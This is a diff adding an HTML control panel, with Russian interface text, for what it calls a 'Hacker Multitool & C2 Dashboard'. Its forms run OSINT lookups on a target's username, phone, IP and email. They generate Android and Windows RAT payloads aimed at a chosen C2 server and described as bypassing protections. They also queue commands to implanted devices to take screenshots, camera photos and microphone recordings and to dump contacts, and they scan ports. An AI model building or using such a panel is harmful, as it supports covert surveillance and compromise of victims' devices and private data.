@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacker Multitool & C2 Dashboard</title>
+    <style>
+        :root {
+            --bg: #0f172a;
+            --card-bg: #1e293b;
+            --border: #334155;
+            --text: #f8fafc;
+            --accent: #38bdf8;
+            --accent-hover: #0284c7;
+            --loader: #facc15;
+            --code-bg: #090d16;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: var(--bg); color: var(--text); font-family: 'Courier New', Courier, monospace; padding: 20px; line-height: 1.5; }
+        h1 { color: var(--accent); margin-bottom: 20px; font-size: 1.5rem; border-bottom: 1px solid var(--border); padding-bottom: 10px; }
+        h3 { color: var(--accent); margin-bottom: 10px; font-size: 1.1rem; }
+        .box { background: var(--card-bg); border: 1px solid var(--border); border-radius: 8px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.3); }
+        p { font-size: 0.9rem; color: #94a3b8; margin-bottom: 12px; }
+        label { display: block; font-size: 0.85rem; margin-top: 10px; color: #cbd5e1; }
+        input, select { background: var(--bg); color: var(--text); border: 1px solid var(--border); padding: 10px; width: 100%; margin-top: 4px; margin-bottom: 12px; border-radius: 4px; font-family: inherit; }
+        input:focus, select:focus { outline: none; border-color: var(--accent); }
+        button { background: var(--accent-hover); color: white; border: none; padding: 10px 16px; cursor: pointer; border-radius: 4px; font-weight: bold; font-family: inherit; transition: background 0.2s; }
+        button:hover { background: #0369a1; }
+        button:disabled { background: #475569; cursor: not-allowed; }
+        .loader { display: none; color: var(--loader); font-size: 0.85rem; margin-left: 10px; font-style: italic; }
+        pre { background: var(--code-bg); border: 1px solid var(--border); padding: 12px; border-radius: 4px; margin-top: 10px; overflow-x: auto; color: #34d399; font-size: 0.85rem; max-height: 250px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+
+    <h1>// HACKER MULTITOOL & C2 CENTRAL DASHBOARD</h1>
+
+    <div class="grid">
+        <!-- Модуль 1: OSINT Никнеймы -->
+        <div class="box">
+            <h3>1. OSINT: Поиск никнейма</h3>
+            <p>Проверка занятости аккаунта на ключевых платформах.</p>
+            <form onsubmit="handleFetch(event, '/api/osint/username', 'targetUsername', 'osintUserBtn', 'osintUserLoader', 'osintUserRes', 'username')">
+                <label>Никнейм:</label>
+                <input type="text" id="targetUsername" placeholder="например, johndoe" required>
+                <button type="submit" id="osintUserBtn">Пробить</button>
+                <span class="loader" id="osintUserLoader">Сканирование...</span>
+            </form>
+            <pre id="osintUserRes">Результат появится здесь...</pre>
+        </div>
+
+        <!-- Модуль 2: OSINT Телефон -->
+        <div class="box">
+            <h3>2. OSINT: Проверка телефона</h3>
+            <p>Валидация, международный формат, оператор и регион.</p>
+            <form onsubmit="handleFetch(event, '/api/osint/phone', 'targetPhone', 'phoneBtn', 'phoneLoader', 'phoneRes', 'phone')">
+                <label>Номер телефона:</label>
+                <input type="text" id="targetPhone" placeholder="+79991234567" required>
+                <button type="submit" id="phoneBtn">Анализ номера</button>
+                <span class="loader" id="phoneLoader">Запрос к базам...</span>
+            </form>
+            <pre id="phoneRes">Результат появится здесь...</pre>
+        </div>
+
+        <!-- Модуль 3: OSINT IP-адрес -->
+        <div class="box">
+            <h3>3. OSINT: Геолокация IP</h3>
+            <p>Определение провайдера, страны, региона и города по IP.</p>
+            <form onsubmit="handleFetch(event, '/api/osint/ip', 'targetIp', 'ipBtn', 'ipLoader', 'ipRes', 'ip')">
+                <label>IP-адрес:</label>
+                <input type="text" id="targetIp" placeholder="8.8.8.8" required>
+                <button type="submit" id="ipBtn">Пробить IP</button>
+                <span class="loader" id="ipLoader">Определение гео...</span>
+            </form>
+            <pre id="ipRes">Результат появится здесь...</pre>
+        </div>
+
+        <!-- Модуль 4: OSINT Email -->
+        <div class="box">
+            <h3>4. OSINT: Анализ почты</h3>
+            <p>Проверка MX-записей домена и следов в Gravatar.</p>
+            <form onsubmit="handleFetch(event, '/api/osint/email', 'targetEmail', 'emailBtn', 'emailLoader', 'emailRes', 'email')">
+                <label>Email адрес:</label>
+                <input type="email" id="targetEmail" placeholder="target@example.com" required>
+                <button type="submit" id="emailBtn">Проверить почту</button>
+                <span class="loader" id="emailLoader">Сбор следов...</span>
+            </form>
+            <pre id="emailRes">Результат появится здесь...</pre>
+        </div>
+    </div>
+
+    <!-- Модуль 5: RAT Генератор -->
+    <div class="box">
+        <h3>5. RAT Payload & Vector Generator</h3>
+        <p>Генерация скриптов внедрения для Android и Windows (обход защит, сбор телеметрии).</p>
+        <form onsubmit="generateRat(event)">
+            <div class="grid" style="margin-bottom:0;">
+                <div>
+                    <label>Целевая платформа:</label>
+                    <select id="deviceType">
+                        <option value="android">Android (Script Stager / APK Shell)</option>
+                        <option value="windows">Windows (PowerShell Cradle)</option>
+                    </select>
+                </div>
+                <div>
+                    <label>Адрес C2 Сервера (Render URL):</label>
+                    <input type="text" id="c2Server" value="your-app.onrender.com" required>
+                </div>
+            </div>
+            <button type="submit" id="ratBtn" style="margin-top: 12px;">Сгенерировать вектор</button>
+            <span class="loader" id="ratLoader">Сборка payload...</span>
+        </form>
+        <pre id="ratRes">Шаблон полезной нагрузки появится здесь...</pre>
+    </div>
+
+    <!-- Модуль 6: C2 Диспетчер команд -->
+    <div class="box">
+        <h3>6. C2 Node Command Dispatcher</h3>
+        <p>Отправка инструкций внедренным агентам через очередь Neon DB.</p>
+        <form onsubmit="sendC2Command(event)">
+            <div class="grid" style="margin-bottom:0;">
+                <div>
+                    <label>ID Узла (Node ID):</label>
+                    <input type="number" id="nodeId" value="1" required>
+                </div>
+                <div>
+                    <label>Команда:</label>
+                    <select id="ratAction">
+                        <option value="screenshot">Сделать скриншот</option>
+                        <option value="cam_snap">Фото с фронтальной камеры</option>
+                        <option value="audio_record">Запись микрофона</option>
+                        <option value="dump_contacts">Выгрузка контактов</option>
+                    </select>
+                </div>
+            </div>
+            <button type="submit" id="c2Btn" style="margin-top: 12px;">Отправить команду в очередь</button>
+            <span class="loader" id="c2Loader">Запись в базу...</span>
+        </form>
+        <pre id="c2Res">Статус отправки появится здесь...</pre>
+    </div>
+
+    <!-- Модуль 7: Сканер портов -->
+    <div class="box">
+        <h3>7. Network Reconnaissance (Port Scanner)</h3>
+        <p>Быстрый аудит открытых портов целевого хоста.</p>
+        <form onsubmit="runPortScan(event)">
+            <div class="grid" style="margin-bottom:0;">
+                <div>
+                    <label>Хост / IP:</label>
+                    <input type="text" id="scanHost" placeholder="127.0.0.1" required>
+                </div>
+                <div>
+                    <label>Порты через запятую:</label>
+                    <input type="text" id="scanPorts" value="21,22,80,443,3306,8080" required>
+                </div>
+            </div>
+            <button type="submit" id="scanBtn" style="margin-top: 12px;">Запустить сканер</button>
+            <span class="loader" id="scanLoader">Сканирование портов...</span>
+        </form>
+        <pre id="scanRes">Результаты сканирования появятся здесь...</pre>
+    </div>
+
+    <script>
+        // Универсальный обработчик запросов с защитой от зависаний (лоадеры + блокировка кнопок)
+        async function handleFetch(e, url, inputId, btnId, loaderId, resId, fieldName) {
+            e.preventDefault();
+            const btn = document.getElementById(btnId);
+            const loader = document.getElementById(loaderId);
+            const resBox = document.getElementById(resId);
+            
+            btn.disabled = true;
+            loader.style.display = 'inline';
+            resBox.innerText = 'Выполнение запроса...';
+
+            try {
+                const formData = new FormData();
+                formData.append(fieldName, document.getElementById(inputId).value);
+                
+                const response = await fetch(url, { method: 'POST', body: formData });
+                const data = await response.json();
+                resBox.innerText = JSON.stringify(data, null, 2);
+            } catch (err) {
+                resBox.innerText = 'Ошибка выполнения: ' + err;
+            } finally {
+                btn.disabled = false;
+                loader.style.display = 'none';
+            }
+        }
+
+        async function generateRat(e) {
+            e.preventDefault();
+            const btn = document.getElementById('ratBtn');
+            const loader = document.getElementById('ratLoader');
+            const resBox = document.getElementById('ratRes');
+            
+            btn.disabled = true;
+            loader.style.display = 'inline';
+            resBox.innerText = '';
+
+            try {
+                const formData = new FormData();
+                formData.append('device_type', document.getElementById('deviceType').value);
+                formData.append('c2_server', document.getElementById('c2Server').value);
+                
+                const response = await fetch('/api/rat/generate', { method: 'POST', body: formData });
+                const data = await response.json();
+                resBox.innerText = data.template || JSON.stringify(data, null, 2);
+            } catch (err) {
+                resBox.innerText = 'Ошибка генерации: ' + err;
+            } finally {
+                btn.disabled = false;
+                loader.style.display = 'none';
+            }
+        }
+
+        async function sendC2Command(e) {
+            e.preventDefault();
+            const btn = document.getElementById('c2Btn');
+            const loader = document.getElementById('c2Loader');
+            const resBox = document.getElementById('c2Res');
+            
+            btn.disabled = true;
+            loader.style.display = 'inline';
+            resBox.innerText = '';
+
+            try {
+                const formData = new FormData();
+                formData.append('node_id', document.getElementById('nodeId').value);
+                formData.append('command', document.getElementById('ratAction').value);
+                
+                const response = await fetch('/api/rat/command', { method: 'POST', body: formData });
+                const data = await response.json();
+                resBox.innerText = JSON.stringify(data, null, 2);
+            } catch (err) {
+                resBox.innerText = 'Ошибка отправки: ' + err;
+            } finally {
+                btn.disabled = false;
+                loader.style.display = 'none';
+            }
+        }
+
+        async function runPortScan(e) {
+            e.preventDefault();
+            const btn = document.getElementById('scanBtn');
+            const loader = document.getElementById('scanLoader');
+            const resBox = document.getElementById('scanRes');
+            
+            btn.disabled = true;
+            loader.style.display = 'inline';
+            resBox.innerText = '';
+
+            try {
+                const formData = new FormData();
+                formData.append('host', document.getElementById('scanHost').value);
+                formData.append('ports', document.getElementById('scanPorts').value);
+                
+                const response = await fetch('/api/tools/portscan', { method: 'POST', body: formData });
+                const data = await response.json();
+                resBox.innerText = JSON.stringify(data, null, 2);
+            } catch (err) {
+                resBox.innerText = 'Ошибка сканирования: ' + err;
+            } finally {
+                btn.disabled = false;
+                loader.style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
